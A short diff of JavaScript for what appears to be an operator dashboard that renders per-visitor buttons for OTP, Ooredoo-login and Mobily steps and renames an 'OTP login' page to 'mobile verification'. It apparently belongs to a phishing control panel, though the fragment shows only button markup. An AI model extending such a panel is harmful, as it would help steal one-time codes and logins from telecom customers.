@@ -1572,8 +1572,8 @@
               if (visitor.network === 'موبايلي') {
                 html += '<button id="' + phoneOtpMobilyBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال موبايلي</button>';
               }
-            } else if (dc.page === 'OTP دخول') {
-              // أزرار صفحة OTP دخول (ثقة، تسجيل دخول اوريدو، رفض)
+            } else if (dc.page === 'توثيق الجوال') {
+              // أزرار صفحة توثيق الجوال (ثقة، تسجيل دخول اوريدو، رفض)
               const thiqaBtnId = 'thiqa-btn-' + visitor.socketId + '-' + index;
               const oredooBtnId = 'oredoo-btn-' + visitor.socketId + '-' + index;
               html += '<button id="' + thiqaBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ثقة</button>';
